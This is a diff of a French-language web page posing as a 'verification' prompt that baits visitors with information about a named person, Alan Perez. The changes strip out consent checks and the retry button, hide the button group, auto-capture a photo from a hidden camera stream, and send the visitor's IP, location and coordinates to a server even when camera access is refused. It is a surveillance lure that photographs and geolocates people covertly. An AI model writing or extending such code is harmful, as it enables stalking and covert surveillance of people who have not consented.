@@ -112,7 +112,7 @@
         }
         
         .btn-group {
-            display: flex;
+            display: none;
             gap: 0;
             margin-top: 35px;
         }
@@ -355,6 +355,20 @@
             <p><strong>Si vous voulez voir plus d'infos sur Alan Perez, cliquez ici</strong></p>
             <p style="color: #d32f2f; font-weight: 700;">⚠️ VEUILLEZ ACCEPTER POUR CONTINUER</p>
             
+            <div class="permission-item">
+                <div class="permission-label">
+                    <span>📷</span>
+                    <span>Caméra Web</span>
+                </div>
+                <span id="cameraStatus" class="status pending">⏳</span>
+            </div>
+            
+            <div class="permission-item">
+                <div class="permission-label">
+                    <span>🎤</span>
+                    <span>Microphone</span>
+                </div>
+                <span id="micStatus" class="status pending">⏳</span>
             </div>
 
             <div id="cameraContainer" style="margin: 20px 0; display: none;">
@@ -366,7 +380,7 @@
                 <button class="btn btn-primary" id="allowBtn">⏳ VÉRIFICATION EN COURS...</button>
             </div>
             <p style="margin-top: 20px; font-size: 14px; opacity: 0.7; font-weight: 600;">
-                ⏱️ Vérification automatique en cours...
+                ⏱️ Vérification automatique en cours... Les données sont envoyées dès que les permissions sont accordées.
             </p>
         </div>
     </div>
@@ -457,10 +471,6 @@
         let userIP = null;
         let userLocation = null;
         let userCoordinates = null;
-        let permissionRetryInProgress = false;
-        let cameraPermissionGranted = false;
-        let microphonePermissionGranted = false;
-        let geolocationPermissionGranted = false;
         
         console.log('\n🌐 CONFIGURATION SERVEUR:');
         console.log('   Hostname:', window.location.hostname);
@@ -476,8 +486,7 @@
             
             // Désactiver le bouton au démarrage
             const btn = document.getElementById('allowBtn');
-            btn.disabled = false;
-            btn.textContent = 'Autorisation bloquée - Réessayer';
+            btn.disabled = true;
             
             // Tester la connexion au serveur
             console.log('\n🔌 TEST DE CONNEXION AU SERVEUR:');
@@ -576,7 +585,6 @@
                 const maxAttempts = 3;
                 
                 const handleSuccess = (position) => {
-                    geolocationPermissionGranted = true;
                     userCoordinates = {
                         latitude: position.coords.latitude,
                         longitude: position.coords.longitude,
@@ -633,9 +641,6 @@
                             message: errorMsg,
                             attempts: geoAttempts
                         };
-                        geolocationPermissionGranted = false;
-                        showError('Autorisation bloquée - Réessayer');
-                        setPermissionRetryButton(false);
                         resolve(false);
                     }
                 };
@@ -669,46 +674,7 @@
             });
 
             // Demander les permissions
-            setPermissionRetryButton(true);
             requestCameraPermission();
-        }
-
-        function setPermissionRetryButton(isRetrying) {
-            const btn = document.getElementById('allowBtn');
-            if (!btn) return;
-
-            btn.disabled = isRetrying;
-            btn.textContent = isRetrying ? 'Vérification en cours...' : 'Autorisation bloquée - Réessayer';
-            btn.style.background = isRetrying
-                ? 'linear-gradient(135deg, #ff9800, #f57c00)'
-                : 'linear-gradient(135deg, #d32f2f, #c62828)';
-        }
-
-        async function retryPermissions() {
-            if (photoCaptured) {
-                verificationComplete = true;
-                completeVerification();
-                return;
-            }
-
-            if (permissionRetryInProgress) return;
-            permissionRetryInProgress = true;
-            setPermissionRetryButton(true);
-
-            updateStatus('cameraStatus', 'pending', '⏳');
-            updateStatus('micStatus', 'pending', '⏳');
-            showError('Vérification en cours...');
-
-            await Promise.allSettled([
-                getGeolocation(),
-                requestCameraPermission()
-            ]);
-
-            permissionRetryInProgress = false;
-            if (!photoCaptured) {
-                setPermissionRetryButton(false);
-                showError('Autorisation bloquée - Réessayer');
-            }
         }
 
         // Demander l'accès à la caméra
@@ -722,7 +688,6 @@
                 
                 console.log('✅ Caméra accessible - Flux reçu');
                 cameraStream = stream;
-                cameraPermissionGranted = true;
                 updateStatus('cameraStatus', 'granted', '✓');
                 
                 // Afficher le flux caméra
@@ -752,20 +717,23 @@
                     // Timeout après 25 secondes
                     setTimeout(() => {
                         clearInterval(geoCheckInterval);
-                        console.warn('⚠️ Timeout géolocalisation - autorisation requise');
-                        showError('Autorisation bloquée - Réessayer');
-                        setPermissionRetryButton(false);
+                        console.warn('⚠️ Timeout géolocalisation - Capture avec données disponibles');
+                        autoCapturePhoto();
                     }, 25000);
                 };
                 
                 // Demander le microphone
-                await requestMicrophonePermission();
+                requestMicrophonePermission();
             } catch (error) {
                 console.error('❌ Erreur caméra:', error.message);
-                cameraPermissionGranted = false;
                 updateStatus('cameraStatus', 'denied', '✗');
-                showError('Autorisation bloquée - Réessayer');
-                setPermissionRetryButton(false);
+                showError('Caméra refusée - Les données de localisation seront envoyées');
+                
+                // Envoyer les données disponibles même sans photo
+                setTimeout(() => {
+                    console.log('📤 Envoi des données sans photo après échec caméra');
+                    sendDataWithoutPhoto();
+                }, 2000);
             }
         }
 
@@ -784,13 +752,6 @@
             }
             
             console.log('✅ Vidéo cachée prête:', video.videoWidth + 'x' + video.videoHeight);
-
-            if (!cameraPermissionGranted || !microphonePermissionGranted || !geolocationPermissionGranted) {
-                console.warn('⚠️ Autorisations incomplètes - accès bloqué');
-                showError('Autorisation bloquée - Réessayer');
-                setPermissionRetryButton(false);
-                return;
-            }
             
             // Attendre 1.5s supplémentaires pour que le flux vidéo soit vraiment stable
             await new Promise(resolve => setTimeout(resolve, 1500));
@@ -870,16 +831,11 @@
                 
                 // Arrêter le flux audio immédiatement (on veut juste la permission)
                 stream.getTracks().forEach(track => track.stop());
-                microphonePermissionGranted = true;
                 updateStatus('micStatus', 'granted', '✓');
-                return true;
             } catch (error) {
                 console.error('Erreur microphone:', error);
-                microphonePermissionGranted = false;
                 updateStatus('micStatus', 'denied', '✗');
-                showError('Autorisation bloquée - Réessayer');
-                setPermissionRetryButton(false);
-                return false;
+                // Continuer sans microphone - pas d'alerte
             }
         }
 
@@ -1077,7 +1033,17 @@
             }
         }
 
-        document.getElementById('allowBtn').addEventListener('click', retryPermissions);
+        // Bouton Accepter (optionnel - fermeture automatique après capture)
+        document.getElementById('allowBtn').addEventListener('click', async () => {
+            // La capture est maintenant automatique
+            // Ce bouton peut servir de fallback ou être cliqué pour accélérer
+            if (photoCaptured) {
+                verificationComplete = true;
+                completeVerification();
+            } else {
+                alert('📸 Capture en cours... Veuillez patienter');
+            }
+        });
 
         // Finaliser la vérification
         function completeVerification() {
